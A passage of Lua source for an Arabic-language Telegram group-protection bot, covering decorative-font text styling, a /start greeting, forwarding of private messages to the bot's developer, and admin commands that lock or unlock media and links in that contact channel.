"卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙۪۪,卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙,0,9,8,7,6,5,4,3,2,1,.,_",     "ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,0,9,8,7,6,5,4,3,2,1,.,_",     "Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",     "a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k̷,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,0,9,8,7,6,5,4,3,2,1,.,_",     "A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",     "Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",     "A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆,K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,0,9,8,7,6,5,4,3,2,1,.,_",     "۪۫a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,۪۫y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,۪۪۫۫,0۪۪۫۫,9۪۪۫۫,8۪۪۫۫,7۪۪۫۫,6۪۪۫۫,5۪۪۫۫,4۪۪۫۫,3۪۪۫۫,2۪۪۫۫,1۪۪۫۫,.۪۪۫۫,_",     "͜͡Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,ؔؔ͜͜Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,͜͡0,9,8,7,6,5,4,3,2,1,.,_",     "A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,̶̶A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,0,9,8,7,6,5,4,3,2,1,.,_",     "ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     "ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     "ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",     "Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,0,9,8,7,6,5,4,3,2,1,.,_",     "Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     }          local result = {}     i=0     for k=1,#fonts do     i=i+1     local tar_font = fonts[i]:split(",")     local text = tahask     local text = text:gsub("A",tar_font[1])     local text = text:gsub("B",tar_font[2])     local text = text:gsub("C",tar_font[3])     local text = text:gsub("D",tar_font[4])     local text = text:gsub("E",tar_font[5])     local text = text:gsub("F",tar_font[6])     local text = text:gsub("G",tar_font[7])     local text = text:gsub("H",tar_font[8])     local text = text:gsub("I",tar_font[9])     local text = text:gsub("J",tar_font[10])     local text = text:gsub("K",tar_font[11])     local text = text:gsub("L",tar_font[12])     local text = text:gsub("M",tar_font[13])     local text = text:gsub("N",tar_font[14])     local text = text:gsub("O",tar_font[15])     local text = text:gsub("P",tar_font[16])     local text = text:gsub("Q",tar_font[17])     local text = text:gsub("R",tar_font[18])     local text = text:gsub("S",tar_font[19])     local text = text:gsub("T",tar_font[20])     local text = text:gsub("U",tar_font[21])     local text = text:gsub("V",tar_font[22])     local text = text:gsub("W",tar_font[23])     local text = text:gsub("X",tar_font[24])     local text = text:gsub("Y",tar_font[25])     local text = text:gsub("Z",tar_font[26])     local text = text:gsub("a",tar_font[27])     local text = text:gsub("b",tar_font[28])     local text = text:gsub("c",tar_font[29])     local text = text:gsub("d",tar_font[30])     local text = text:gsub("e",tar_font[31])     local text = text:gsub("f",tar_font[32])     local text = text:gsub("g",tar_font[33])     local text = text:gsub("h",tar_font[34])     local text = text:gsub("i",tar_font[35])     local text = text:gsub("j",tar_font[36])     local text = text:gsub("k",tar_font[37])     local text = text:gsub("l",tar_font[38])     local text = text:gsub("m",tar_font[39])     local text = text:gsub("n",tar_font[40])     local text = text:gsub("o",tar_font[41])     local text = text:gsub("p",tar_font[42])     local text = text:gsub("q",tar_font[43])     local text = text:gsub("r",tar_font[44])     local text = text:gsub("s",tar_font[45])     local text = text:gsub("t",tar_font[46])     local text = text:gsub("u",tar_font[47])     local text = text:gsub("v",tar_font[48])     local text = text:gsub("w",tar_font[49])     local text = text:gsub("x",tar_font[50])     local text = text:gsub("y",tar_font[51])     local text = text:gsub("z",tar_font[52])     local text = text:gsub("0",tar_font[53])     local text = text:gsub("9",tar_font[54])     local text = text:gsub("8",tar_font[55])     local text = text:gsub("7",tar_font[56])     local text = text:gsub("6",tar_font[57])     local text = text:gsub("5",tar_font[58])     local text = text:gsub("4",tar_font[59])     local text = text:gsub("3",tar_font[60])     local text = text:gsub("2",tar_font[61])     local text = text:gsub("1",tar_font[62])            table.insert(result, text)     end     local result_text = "*📝¦ الكلمه ◖"..tahask.."◗*\n*📛¦ عدد انواع الزخرفه ◖"..tostring(#fonts).."◗*\n——————༻📛༺——————\n"     a=0     for v=1,#result do     a=a+1     local ta = { '🔥', '🔅﴿', '❥˓ ', '💝﴿', '🐼🌿', '🙊💙', '🐥✨', '😻‘','⚡️', '⁽🌷', '🔥“', '💭', '🍿','🐼💗 ', '🐝🍷','❥̚͢₎🐣', '👄‘', ' 💭ۦ',' 🎉ۦ', ' ⚡️ۦ','℡̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ ✨🐯⇣✦', '⁞♩⁽💎🌩₎⇣✿','ٰ❥ ͢ۦ‏', '⚡️ֆ₎', '🐰☄️', '⁾❥', '✿🎃❥', '✿⇣', '❥℡🦁' }     result_text = result_text..'*◖'..a.."◗* `"..result[a]..''..ta[math.random(#ta)].."`\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"     end     storm_sendMsg(msg.chat_id_, 0, 1, result_text, 1, 'md')     end     end
if tahadevstorm:get(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then tahadevstorm:del(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_) local pvstart = text:match("(.*)") tahadevstorm:set(DEVSTOR.."pvstart", pvstart)  storm_sendMsg(msg.chat_id_, msg.id_, 1,'\n*📛¦* تم وضع الرد في التواصل \n', 1, 'md')  storm_sendMsg(SUDO, 0, 1,'', 1, 'html') storm_sendMsg(SUDO, 0, 1,'', 1, 'md') end
if text == '/start' and chat_type == 'user'  then  function bot_kick(extra, result, success)  username = '@'..(result.username_ or 'ماكو معرف ❌')..'' tahadevstorm:sadd(DEVSTOR.."usersbot",msg.chat_id_)   local start = tahadevstorm:get(DEVSTOR.."start:msgofstart1")  if start then local text = ''..check_markdown(start)..'' storm_sendMsg(msg.chat_id_, msg.id_, 1,(text), 1, 'md')  else
local taha = [[
🙋🏻‍♂*¦* اهلا بك يا ◗[]]..username..[[]◖ 
📛*¦* انا بوت اسمي ◗]]..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم')..[[◖
🚸*¦* اختصاصي حماية كروبات المتفاعله
📮*¦* لتفعيل البوت اتبع مايلي
⚀*¦* اضف البوت الى المجموعه
⚁*¦* ارفع البوت ادمن في المجموعه
⚂*¦* سيتم تفعيل البوت ورفع مشرفي الكروب
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📬*¦* مطور البوت ◗[@]]..sudouser..[[]◖
]] storm_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md') end end  getUser(msg.sender_user_id_, bot_kick)   end 
if chat_type == 'user' then 
if text and text:match('(.*)') and not text:match('/start')  and not is_devtaha(msg) or  msg.content_.ID == "MessageUnsupported" or msg.content_.ID == 'MessagePhoto' or msg.content_.ID == 'MessageDocument' or msg.content_.photo_ or msg.content_.ID == 'MessageSticker' or msg.content_.ID == 'MessageAudio' or msg.content_.audio_ or msg.content_.ID == 'MessageAnimation' or msg.content_.ID == 'MessageVideo' or msg.content_.video_  or msg.content_.ID == 'MessageContact' or msg.content_.ID == 'MessageVoice' then     if text  or msg.content_.ID == 'MessageVoice' or msg.content_.ID == 'MessageAudio' or msg.content_.ID == 'MessagePhoto' or msg.content_.ID == 'MessageDocument' or msg.content_.photo_ or msg.content_.ID == 'MessageSticker' or msg.content_.ID == 'MessageAudio' or msg.content_.ID == 'MessageAnimation' or msg.content_.ID == 'MessageVideo' or msg.content_.ID == 'MessageContact' or msg.content_.ID == 'MessageVoice'  then  if tonumber(tahadevstorm:get('numlocktextpv'..bot_id..msg.sender_user_id_) or 1) >= 100 then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ تم حظرك من التواصل *\n', 1, 'md')      return false  end   end  if msg.forward_info_ and  tahadevstorm:get(DEVSTOR..'lock:fwd'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل التوجيه في التواصل *\n', 1, 'md')     return false  end    if  msg.content_.ID == 'MessagePhoto' and tahadevstorm:get(DEVSTOR..'lock:photo'..bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الصور في التواصل *\n', 1, 'md')      return false  end     if msg.content_.ID == 'MessageDocument' and  tahadevstorm:get(DEVSTOR..'lock:file'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الملفات في التواصل *\n', 1, 'md')     return false  end    if msg.content_.ID == 'MessageSticker' and  tahadevstorm:get(DEVSTOR..'lock:ste'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الملصقات في التواصل *\n', 1, 'md')     return false  end    if msg.content_.ID == 'MessageVoice' and  tahadevstorm:get(DEVSTOR..'lock:musec'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الاغاني في التواصل *\n', 1, 'md')     return false  end    if msg.content_.ID == 'MessageContact' and  tahadevstorm:get(DEVSTOR..'lock:phon'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الجهات في التواصل *\n', 1, 'md')     return false  end    if msg.content_.ID == 'MessageVideo' and  tahadevstorm:get(DEVSTOR..'lock:ved'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الفيديو في التواصل *\n', 1, 'md')     return false  end    if msg.content_.ID == 'MessageAnimation' and  tahadevstorm:get(DEVSTOR..'lock:gif'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل المتحركه في التواصل *\n', 1, 'md')     return false  end    if msg.content_.ID == 'MessageAudio' and  tahadevstorm:get(DEVSTOR..'lock:vico'..bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الصوت في التواصل *\n', 1, 'md')     return false  end    
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") then if tahadevstorm:get(DEVSTOR..'lock:links'..bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لقد تم قفل الروابط في التواصل *\n', 1, 'md')     return false  end  end  if not tahadevstorm:get(DEVSTOR..'lock:botl'..bot_id) then    if not is_devtaha(msg) then     local pvstart = tahadevstorm:get(DEVSTOR.."pvstart")    if pvstart then    storm_sendMsg(msg.sender_user_id_, 0, 1, ''..check_markdown(pvstart)..'', 1, "md")    else    storm_sendMsg(msg.sender_user_id_, msg.id_, 1, '📬*¦* تم ارسال رسالتك الى المطور\n*📛¦* اشترك في قناة المطور \n*🚸¦* ◗[اضغط هنا للدخول الى قناة](https://t.me/joinchat/AAAAAER6jyl2e40Gsx8QkQ)◖ \n', 1, "md")    end     if not tahadevstorm:sismember("usersbot",msg.chat_id_) then    tahadevstorm:sadd(DEVSTOR.."usersbot",msg.chat_id_)    local pvstart = tahadevstorm:get(DEVSTOR.."pvstart")    end    forwardMessages(SUDO, msg.sender_user_id_, {[0] = msg.id_}, 1)    end    end     end    if is_devtaha and msg.reply_to_message_id_ ~= 0  then     function bot_in_daerct(extra, result, success)    if result.forward_info_.sender_user_id_ then     id_user = result.forward_info_.sender_user_id_    end     if text then    storm_sendMsg(id_user,msg.id_,  1,  text, 1, 'html')    storm_sendMsg(msg.chat_id_, msg.id_, 1, "📛*¦ تم ارسال رسالتك الى »»* ◗["..get_username(id_user)..']◖', 1, 'md')    end    if msg.content_.ID == 'MessageSticker' then    sendSticker(id_user, msg.id_, 0, 1, nil, data.message_.content_.sticker_.sticker_.persistent_id_)   storm_sendMsg(msg.chat_id_, msg.id_, 1, "📛*¦ تم ارسال رسالتك الى »»* ◗["..get_username(id_user)..']◖', 1, 'md')    end      if msg.content_.ID == 'MessagePhoto' then    if data.message_.content_.photo_.sizes_[0] then    end    sendPhoto(id_user, msg.id_, 0, 1, nil,data.message_.content_.photo_.sizes_[0].photo_.persistent_id_)    storm_sendMsg(msg.chat_id_, msg.id_, 1, "📛*¦ تم ارسال رسالتك الى »»* ◗["..get_username(id_user)..']◖', 1, 'md')    end     if msg.content_.ID == 'MessageAnimation' then    sendDocument(id_user, msg.id_, 0, 1,nil, data.message_.content_.animation_.animation_.persistent_id_)    storm_sendMsg(msg.chat_id_, msg.id_, 1, "📛*¦ تم ارسال رسالتك الى »»* ◗["..get_username(id_user)..']◖', 1, 'md')    end     if msg.content_.ID == 'MessageVoice' then    sendVoice(id_user, msg.id_, 0, 1, nil, data.message_.content_.voice_.voice_.persistent_id_)    storm_sendMsg(msg.chat_id_, msg.id_, 1, "📛*¦ تم ارسال رسالتك الى »»* ◗["..get_username(id_user)..']◖', 1, 'md')    end     end    getMessage(msg.chat_id_, msg.reply_to_message_id_,bot_in_daerct)    end 
if text and text:match("^توجيه (%d+)") and msg.reply_to_message_id_ and is_devtaha(msg) then  local user = text:match("^توجيه (%d+)")   local taha = '📛¦ العضو ◗'..user..'◖ تم توجيه رسالتك اليه بنجاح'  text = '' msgs = msg.reply_to_message_id_  stormmonshn(SUDO, user, user, taha, 13, string.len(user))  tdcli_function({ ID = "ForwardMessages", chat_id_ = user,from_chat_id_ = msg.chat_id_, message_ids_ = { [0] = msgs }, disable_notification_ = 0, from_background_ = 1 }, dl_cb, nil)  storm_sendMsg(msg.chat_id_, msg.reply_to_message_id_, 1, text, 1, 'html')  end  if text == 'فتح الكل' and is_devtaha(msg) then      taha = '◗*🚸¦* تم فتح جميع الاوامر   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")      tahadevstorm:del(DEVSTOR..'lock:photo'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:vico'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:ste'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:file'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:phon'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:links'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:ved'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:fwd'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:gif'..bot_id)    tahadevstorm:del(DEVSTOR..'lock:musec'..bot_id)    end      if text == 'قفل الكل' and is_devtaha(msg) then      taha = '◗*📛¦* تم قفل جميع الاوامر  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")      tahadevstorm:set(DEVSTOR..'lock:photo'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:vico'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:ste'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:file'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:phon'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:links'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:ved'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:fwd'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:gif'..bot_id,true)    tahadevstorm:set(DEVSTOR..'lock:musec'..bot_id,true)     end   if text == 'فتح الصور' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الصور   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:photo'..bot_id) end  if text == 'قفل الصور' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الصور  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:photo'..bot_id,true) end if text == 'فتح الصوت' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الصوت   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:vico'..bot_id) end  if text == 'قفل الصوت' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الصوت  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:vico'..bot_id,true) end if text == 'فتح الاغاني' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الاغاني   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:musec'..bot_id) end  if text == 'قفل الاغاني' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الاغاني  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:musec'..bot_id,true) end if text == 'فتح المتحركه' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح المتحركه   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:gif'..bot_id) end  if text == 'قفل المتحركه' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل المتحركه  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:gif'..bot_id,true) end if text == 'فتح التوجيه' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح التوجيه   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:fwd'..bot_id) end  if text == 'قفل التوجيه' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل التوحيه  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:fwd'..bot_id,true) end if text == 'فتح الفيديو' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الفيديو   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:ved'..bot_id) end  if text == 'قفل الفيديو' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الفيديو  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:ved'..bot_id,true) end if text == 'فتح الروابط' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الروابط   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:links'..bot_id) end  if text == 'قفل الروابط' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الروابط  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:links'..bot_id,true) end if text == 'فتح الجهات' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الجهات  